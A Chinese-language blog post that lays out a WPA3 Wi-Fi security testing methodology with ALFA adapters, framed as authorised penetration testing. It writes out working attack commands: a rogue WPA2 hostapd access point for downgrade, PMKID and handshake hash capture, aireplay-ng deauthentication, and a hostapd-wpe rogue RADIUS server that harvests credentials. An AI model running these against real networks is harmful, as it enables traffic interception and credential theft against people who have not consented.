---
title: "使用 ALFA 無線網卡進行 WPA3 安全測試 (2026)"
description: "使用 ALFA Network 無線網卡進行 WPA3 安全測試的完整指南。涵蓋 SAE 握手分析、Dragonblood 漏洞、轉換模式降級攻擊、PMF 強制執行，以及 WPA3-Enterprise EAP 測試。"
date: 2026-03-24
draft: false
showBreadcrumbs: true
showTableOfContents: true
tags: ["WPA3", "SAE", "dragonblood", "transition-mode", "PMF", "kali-linux", "ALFA-network", "penetration-testing"]
featureimage: "/images/blog/wpa3-security-testing-alfa-2026.webp"
author: "benny-lai"
lastmod: 2026-07-02
faq:
  - question: "WPA3 與 WPA2 在安全測試上有何不同？"
    answer: "WPA3 採用 SAE 握手取代 PSK，具備前向保密且無法離線字典攻擊。PMF 為強制要求，但轉換模式引入了降級攻擊面。"
  - question: "SAE 握手擷取後可以離線破解嗎？"
    answer: "不行。純 SAE 網路不產生可破解的雜湊值。擷取 SAE 幀僅用於協定層級分析，確認正確變體與 PMF 協商。"
  - question: "什麼是 WPA3 轉換模式降級攻擊？"
    answer: "轉換模式 AP 同時接受 SAE 與 PSK。攻擊者偽造純 WPA2 流氓 AP，若用戶端未強制 SAE 即完成降級，握手可被離線破解。"
  - question: "測試 WPA3 需要 6 GHz 網卡嗎？"
    answer: "僅測試 6 GHz 頻段上的 WPA3 網路時需要 AWUS036AXML。2.4/5 GHz 上的 WPA3 測試使用 AWUS036ACH 即可。"
  - question: "Dragonblood 漏洞還需要測試嗎？"
    answer: "現代 AP 韌體多已修補，但使用舊版或未修補韌體的環境仍需測試 CVE-2019-9494 等側通道攻擊與 SAE commit 洪泛 DoS。"
---

{{< alert "triangle-exclamation" >}}
**法律聲明：** 所有無線安全測試僅可在您擁有明確書面授權的網路和設備上執行。WPA3 測試技術（包括 SAE 封包擷取、去認證攻擊及流氓 AP 部署）與其他無線評估活動受相同法律規範約束。請僅於授權環境下進行測試。
{{< /alert >}}

WPA3 以 SAE 握手取代 PSK，具備前向保密與強制 PMF。主要攻擊面為轉換模式降級、Dragonblood 漏洞與企業 EAP 憑證驗證，需 ALFA 網卡進行完整評估。

{{< tldr >}}
WPA3 安全測試涵蓋 SAE 握手分析、轉換模式降級攻擊、Dragonblood 漏洞評估與 PMF 強制執行。AWUS036AXML 用於 6 GHz 測試，AWUS036ACH 適用 2.4/5 GHz。
{{< /tldr >}}

WPA3 在個人與企業無線安全性方面，相較 WPA2 有顯著的改進。Simultaneous Authentication of Equals (SAE) 取代了 Pre-Shared Key (PSK) 握手，改採對離線字典攻擊具備抵抗能力的密碼驗證金鑰交換機制。Protected Management Frames (PMF) 為強制要求。前向保密已內建於協定之中。

然而，WPA3 並非毫無漏洞。Dragonblood 研究（2019 年）揭露了 SAE 握手中的側通道攻擊與阻斷服務漏洞。轉換模式引入了降級攻擊面。企業部署同樣面臨與 WPA2-Enterprise 相同的 802.1X 憑證驗證弱點。本指南使用 ALFA Network 無線網卡，涵蓋完整的 WPA3 安全測試方法論。ALFA 無線網卡具備進行全面評估所需的監聽模式穩定性與封包注入能力。

---

## 安全測試人員應了解的 WPA3 基礎知識

### SAE：Simultaneous Authentication of Equals

SAE 以基於 Dragonfly 金鑰交換協定的零知識證明交換，取代了 WPA2-PSK 的四向握手。對安全測試而言最關鍵的特性是**前向保密**：即使日後 Wi-Fi 密碼遭到洩漏，先前擷取的流量也無法被解密。這消除了對純 SAE 網路進行離線密語破解的主要價值。

SAE 同時消除了影響 WPA2 的 PMKID 攻擊漏洞。被動攻擊者無法從 SAE 關聯中提取任何可供離線破解的對應物。

### PMF：WPA3 強制要求

802.11w Protected Management Frames 在 WPA3 中為強制要求。去認證與解除關聯幀受到密碼學保護，防止對未啟用 PMF 的 WPA2 網路輕易有效的偽造去認證攻擊。純 WPA3 網路理應不受基於去認證的握手擷取加速攻擊影響。

### WPA3 轉換模式

最常見的實際部署情境是 **WPA3 轉換模式**：AP 同時接受 WPA3-SAE 與 WPA2-PSK 認證，以維持對不支援 WPA3 裝置的向下相容性。此模式是當前企業環境中主要的攻擊面——它在一個宣傳支援 WPA3 的網路上，重新引入了 WPA2 PSK 握手的暴露風險。

### WPA3-Enterprise

WPA3-Enterprise 強制要求使用 GCMP-256 與 HMAC-SHA-384 的 192 位元安全模式，並採用基於憑證的雙向認證。若未正確部署，它同樣面臨與 WPA2-Enterprise 相同的憑證驗證漏洞。802.1X 層的測試方法論請參閱[企業無線安全評估框架](/zh-tw/blog/enterprise-wireless-security-assessment/)。

---

## 測試環境與網卡需求

### 網卡選擇

WPA3 測試需要具備可靠監聽模式、封包注入支援，以及——針對 6 GHz WPA3 網路——三頻段能力的網卡：

- **AWUS036AXML** — Wi-Fi 6E (6 GHz) WPA3 網路的必要選擇。採用 Mediatek MT7921AUN 晶片組。在 Kali Linux 搭配 kernel 5.18+ 環境下，完整支援監聽模式與封包注入。這是唯一涵蓋 6 GHz 頻道的 ALFA 網卡，而純 WPA3 部署在該頻段日益普遍。
- **AWUS036ACH** — 適用於 2.4/5 GHz WPA3 測試。採用 RTL8812AU 晶片組。與 aircrack-ng 工具鏈相容性最佳，跨 Kali Linux 版本的驅動程式支援最廣泛。

### 啟用監聽模式

```bash
# 終止干擾行程
sudo airmon-ng check kill

# 啟動監聽模式
sudo airmon-ng start wlan0

# 確認監聽介面
iwconfig wlan0mon
```

完整的監聽模式設定指南，請參閱[在 Kali Linux 上啟用監聽模式](/zh-tw/blog/enable-monitor-mode-kali-linux/)。

### 在掃描結果中識別 WPA3 網路

```bash
# 對所有頻段進行被動掃描
sudo airodump-ng wlan0mon --band abg -w wpa3_scan

# 在結果中篩選 WPA3 網路
sudo airodump-ng wlan0mon --band abg | grep -i "SAE\|WPA3"
```

在 airodump-ng 的輸出中，WPA3-SAE 網路的 AUTH 欄位顯示為 `WPA3 SAE`。轉換模式網路顯示為 `WPA2 WPA3 SAE PSK`。開放式 (OWE) 增強網路顯示為 `OWE`。

---

## 第一階段：SAE 握手擷取與分析

### 被動擷取的限制

與 WPA2 不同，**SAE 握手無法用於離線字典攻擊**。使用任何監聽模式網卡擷取 SAE commit 與 confirm 幀相當直接，但擷取的內容不會產生可破解的雜湊值。擷取 SAE 幀的目的在於協定層級分析——驗證正在使用正確的 SAE 變體、確認 PMF 已協商完成，並在評估報告中提供佐證。

```bash
# 在目標 AP 頻道上進行擷取
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w sae_capture wlan0mon

# 在 Wireshark 中分析擷取內容
# 篩選器：wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x000b
# (0x000b = Authentication 幀)
wireshark -r sae_capture-01.cap
```

在 Authentication 幀中，確認 SAE commit 與 confirm 交換。Beacon 幀中的 RSN Information Element 應顯示：
- **AKM Suite**：WPA3-Personal 使用 00-0F-AC:8 (SAE)
- **PMF**：Required（RSN Capabilities 中的 MFPR 位元已設置）

### SAE 網路的 PMKID 測試

`hcxdumptool` 等工具會嘗試對所有網路進行 PMKID 提取，但 SAE 網路不會暴露可破解的 PMKID。執行該工具有助於確認不存在 WPA2 PMKID 暴露的情況：

```bash
# 嘗試 PMKID 擷取——SAE 網路應不產生可破解的 PMKID
sudo hcxdumptool -i wlan0mon -o wpa3_pmkid.pcapng --enable_status=3

# 轉換並檢查
hcxpcapngtool -o wpa3_hashes.hc22000 wpa3_pmkid.pcapng

# 空檔案或不存在的雜湊檔案，確認沒有 WPA2 PMKID 暴露
wc -l wpa3_hashes.hc22000
```

若 `hcxpcapngtool` 針對宣稱為純 WPA3 的網路輸出了包含內容的 `.hc22000` 檔案，這表示該 AP 正以轉換模式運作，並暴露了 WPA2 PMKID——這是一項重大發現。

---

## 第二階段：轉換模式降級攻擊測試

### 降級攻擊面

WPA3 轉換模式是當前企業環境中最具影響力的 WPA3 漏洞。當 AP 以轉換模式運作時，它同時接受 SAE 與 PSK 關聯。能夠觀察到用戶端探測請求的攻擊者，可以偽造一個僅提供相同 SSID 的 WPA2-PSK 功能的流氓 AP——若用戶端在未要求 SAE 的情況下連線，標準的 WPA2 四向握手便會被擷取，並可進行離線攻擊。

### 測試程序

```bash
# 步驟一：確認目標處於轉換模式（airodump-ng 顯示 WPA2+WPA3）
sudo airodump-ng wlan0mon --band abg | grep "TARGET_SSID"

# 步驟二：擷取合法 AP 的 beacon 幀，記錄其頻道與設定
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w transition_recon wlan0mon

# 步驟三：使用 hostapd 在相同頻道建立純 WPA2 流氓 AP
# 建立 /tmp/rogue_wpa2.conf：
cat > /tmp/rogue_wpa2.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
wpa=2
wpa_passphrase=TestPassphrase123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/rogue_wpa2.conf &

# 步驟四：監控流氓 AP 上的用戶端關聯情況
sudo airodump-ng -c 6 --bssid ROGUE_BSSID -w downgrade_capture wlan0mon
```

**關鍵發現：** 若先前透過 SAE 連線的用戶端關聯至純 WPA2 流氓 AP（擷取檔案中出現四向握手即為佐證），則表示該用戶端作業系統並未強制要求 WPA3-SAE。這代表降級攻擊成功。

**通過條件：** 用戶端忽略純 WPA2 AP 或顯示警告，且未完成 WPA2 握手。

### hcxpcapngtool 輸出中的降級指標

```bash
# 轉換流氓 AP 的擷取檔案——有雜湊值則確認發生了 WPA2 關聯
hcxpcapngtool -o downgrade_hash.hc22000 downgrade_capture-01.cap
cat downgrade_hash.hc22000
# 非空輸出 = 降級攻擊成功
```

---

## 第三階段：Dragonblood 漏洞評估

### 背景

Dragonblood 研究（Vanhoef & Ronen，2019 年）識別出 SAE 握手實作中的多項漏洞：

- **CVE-2019-9494 / CVE-2019-9496**：針對 SAE commit 幀的側通道攻擊（基於快取與時序），可對未修補的實作進行離線字典攻擊
- **CVE-2019-9499**：SAE 確認繞過，導致 WPA3-Personal 降級至 WPA2-PSK
- **透過 SAE commit 洪泛進行 DoS 攻擊**：藉由傳送大量 SAE commit 幀耗盡 AP 狀態表

現代 AP 韌體大多已修補原始的 Dragonblood 漏洞。然而，在使用較舊或未修補 AP 韌體的環境中，測試這些漏洞仍有其必要性。

### SAE 防洪令牌（Anti-Clogging Token）測試

WPA3-SAE 包含防洪令牌機制，以防止透過 commit 洪泛進行的 DoS 攻擊。測試目標 AP 是否正確實作了防洪令牌：

```bash
# 安裝 hcxtools
sudo apt install hcxtools

# 使用 hcxdumptool 觀察 SAE commit/confirm 幀交換的速率限制
sudo hcxdumptool -i wlan0mon -o dragonblood_test.pcapng --enable_status=3

# 在 Wireshark 中篩選 Authentication 幀並觀察：
# wlan.fc.type_subtype == 0x000b
# 在 commit 幀中尋找 Anti-Clogging Token (ACT) 回應
wireshark -r dragonblood_test.pcapng
```

在正確實作的 AP 中，來自多個來源 MAC 位址的快速 SAE commit 請求，應觸發 Anti-Clogging Token 回應（AP 返回一個令牌，後續 commit 幀必須包含該令牌）。未實作 ACT 的 AP 容易遭受 SAE commit 洪泛 DoS 攻擊。

### 檢查 AP 韌體版本

AP 韌體版本是修補狀態的重要指標。將所發現的 AP 韌體版本與廠商安全公告進行比對：

- Cisco：安全公告 cisco-sa-wpa3-sae-side-channel（2019 年）
- Aruba：ArubaOS 8.6+ 修補 Dragonblood
- Ubiquiti：UniFi Network 6.0+ 修補 Dragonblood
- MikroTik：RouterOS 6.45.7+ 修補 Dragonblood

在評估報告中記錄 AP 韌體版本。無論是否確認了主動利用，執行早於上述版本韌體的 AP 均應被標記為潛在漏洞對象。

---

## 第四階段：WPA3 網路的 PMF 強制執行測試

### PMF 測試仍然適用的原因

儘管 PMF 在 WPA3 中為強制要求，實際強制執行行為的測試仍然重要，原因如下：

1. 轉換模式 AP 的 WPA2 路徑可能將 PMF 設定為「capable」而非「required」，允許對 WPA2 連線的用戶端發動去認證攻擊
2. AP 設定錯誤可能導致即使在 SAE 關聯上也未協商 PMF
3. 用戶端實作可能未能正確強制執行 PMF，即使 AP 宣告其為必要條件

### 去認證測試

```bash
# 嘗試對透過 WPA3-SAE 關聯的測試用戶端進行去認證
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# 正確設定的 WPA3 網路預期結果：
# - 測試用戶端不會斷線（受 PMF 保護的管理幀被丟棄）
# - airodump-ng 未顯示擷取到握手

# 失敗條件（發現）：
# - 測試用戶端斷線並重新關聯
# - airodump-ng 擷取到新的握手
```

### PMF Capable 與 Required 的差異

檢查 beacon 幀中的 RSN Information Element 以確認 PMF 設定：

```bash
# 擷取 beacon 幀並解碼 RSN IE
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr \
  -c 5 2>/dev/null
```

輸出解讀：
- `1,1` — PMF Required（MFPR=1，MFPC=1）：WPA3 的正確設定
- `1,0` — PMF Capable 但非 Required：WPA3 網路為中級發現，企業 SSID 為高級發現
- `0,0` — PMF 已停用：任何宣稱支援 WPA3 的網路均為高級發現；表示 AP 設定錯誤

---

## 第五階段：OWE（機會性無線加密）測試

### OWE 概述

OWE（Wi-Fi Enhanced Open）是 WPA3 針對完全開放（未加密）訪客網路的替代方案。OWE 執行未認證的 Diffie-Hellman 金鑰交換，無需密碼即可建立每次連線的加密。它防止訪客網路上的被動竊聽，但不提供認證功能。

### 測試 OWE 轉換模式

許多 AP 將 OWE 與舊式開放 SSID 並行部署於轉換模式（開放 SSID 為隱藏狀態，OWE SSID 可見）。測試用戶端是否可被迫連接至舊式開放 SSID：

```bash
# 掃描與 OWE 網路配對的隱藏 SSID
sudo airodump-ng wlan0mon --band abg | grep -E "OWE|\<length: 0\>"

# 與 OWE SSID 配對且無加密的隱藏 SSID 即為轉換 SSID
# 支援 WPA3 的用戶端應優先選擇 OWE；舊式用戶端回退至開放模式
```

**發現：** 若支援 WPA3 的用戶端連接至開放轉換 SSID 而非 OWE SSID，表示該用戶端作業系統未能正確處理 OWE 轉換模式。該用戶端的所有流量均未加密。

---

## 第六階段：WPA3-Enterprise 評估

### 192 位元安全模式驗證

WPA3-Enterprise 在 192 位元安全模式中強制要求 GCMP-256 加密與 HMAC-SHA-384 認證。透過 beacon 幀中的 RSN IE 進行驗證：

```bash
# 擷取並解碼企業 SSID 的 RSN IE
sudo tshark -i wlan0mon -f "wlan type mgt subtype beacon and wlan.bssid == aa:bb:cc:dd:ee:ff" \
  -T fields -e wlan_mgt.rsn.pcs.type -e wlan_mgt.rsn.akms.type \
  -c 10 2>/dev/null
```

WPA3-Enterprise 192 位元的預期值：
- **Pairwise Cipher Suite**：GCMP-256（00-0F-AC:9）
- **AKM Suite**：EAP-SHA384（00-0F-AC:12）或 FT-EAP-SHA384（00-0F-AC:13）

WPA3-Enterprise 網路上出現 CCMP-128 為中級發現；表示 AP 未強制執行 192 位元安全要求。

### 流氓 RADIUS 測試

若用戶端未驗證伺服器憑證，WPA3-Enterprise 將容易遭受流氓 RADIUS 攻擊。測試方法論與 WPA2-Enterprise 相同：

```bash
# 使用 hostapd-wpe 部署帶有流氓 RADIUS 的流氓 AP
sudo apt install hostapd-wpe

# 編輯 /etc/hostapd-wpe/hostapd-wpe.conf，設定目標 SSID 與頻道
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 監控擷取到的憑證雜湊值
```

完整的 EAP/RADIUS 測試程序，請參閱[企業無線安全評估框架](/zh-tw/blog/enterprise-wireless-security-assessment/)。

---

## WPA3 測試工具參考

<div class="table-nowrap" style="overflow-x: auto;">

| 工具 | 用途 | 網卡 | 關鍵指令 |
|---|---|---|---|
| airodump-ng | WPA3 網路探索、SAE 幀擷取 | AWUS036AXML / AWUS036ACH | `sudo airodump-ng wlan0mon --band abg` |
| hcxdumptool | PMKID/SAE 擷取、轉換模式偵測 | AWUS036AXML | `sudo hcxdumptool -i wlan0mon -o out.pcapng --enable_status=3` |
| hcxpcapngtool | 轉換擷取內容、偵測轉換模式中的 WPA2 暴露 | N/A（後處理） | `hcxpcapngtool -o hash.hc22000 cap.pcapng` |
| Wireshark / tshark | RSN IE 分析、PMF 能力、SAE 幀檢查 | 任意（透過擷取檔案） | `tshark -i wlan0mon -T fields -e wlan_mgt.rsn.capabilities.mfpr` |
| aireplay-ng | PMF 強制執行測試（去認證） | AWUS036ACH | `sudo aireplay-ng --deauth 10 -a BSSID wlan0mon` |
| hostapd | 用於降級測試的純 WPA2 流氓 AP | AWUS036ACH | `sudo hostapd /tmp/rogue_wpa2.conf` |
| hostapd-wpe | 用於 WPA3-Enterprise EAP 測試的流氓 RADIUS | AWUS036ACH | `sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf` |

</div>

---

## WPA3 評估發現摘要

| ID | 嚴重性 | 發現 | 條件 |
|---|---|---|---|
| W3-01 | 嚴重 | WPA3 成功降級至 WPA2；握手已擷取且可破解 | 用戶端關聯至純 WPA2 流氓 AP；已取得雜湊值 |
| W3-02 | 高 | 轉換模式未強制執行 SAE；WPA2 PMKID 已暴露 | hcxpcapngtool 從 WPA3 網路返回可破解雜湊值 |
| W3-03 | 高 | WPA3 SSID 未強制執行 PMF；去認證攻擊成功 | 測試用戶端被 aireplay-ng 去認證後斷線 |
| W3-04 | 高 | WPA3-Enterprise 用戶端接受流氓 RADIUS 且無憑證警告 | hostapd-wpe 從測試用戶端擷取到 EAP 憑證 |
| W3-05 | 中 | WPA3 SSID 的 PMF 為 Capable 但非 Required | RSN IE 顯示 MFPC=1，MFPR=0 |
| W3-06 | 中 | WPA3-Enterprise 未使用 192 位元安全模式 | RSN IE 顯示 CCMP-128 而非 GCMP-256 |
| W3-07 | 中 | AP 韌體早於 Dragonblood 修補版本 | 韌體版本與廠商公告比對 |
| W3-08 | 低 | OWE 轉換模式；舊式用戶端以未加密方式連線 | 開放 SSID 與 OWE SSID 並存可見 |

---

{{< faq >}}

## 相關資源

- [企業無線安全評估：完整框架](/zh-tw/blog/enterprise-wireless-security-assessment/)
- [封包注入指南：使用 aireplay-ng 測試您的 WiFi 網卡](/zh-tw/blog/packet-injection-guide/)
- [在 Kali Linux 上啟用監聽模式](/zh-tw/blog/enable-monitor-mode-kali-linux/)

## 參考來源

1. [Dragonblood 官方研究論文（Vanhoef & Ronen, 2019）](https://papers.mathyvanhoef.com/dragonblood.pdf)
2. [Wi-Fi Alliance WPA3 認證說明](https://www.wi-fi.org/discover-wi-fi/wpa3)
3. [aircrack-ng 官方文件](https://www.aircrack-ng.org/documentation.html)
4. [hcxdumptool 工具文件](https://github.com/ZerBea/hcxdumptool)
5. [IEEE 802.11w PMF 標準](https://standards.ieee.org/ieee/802.11/)
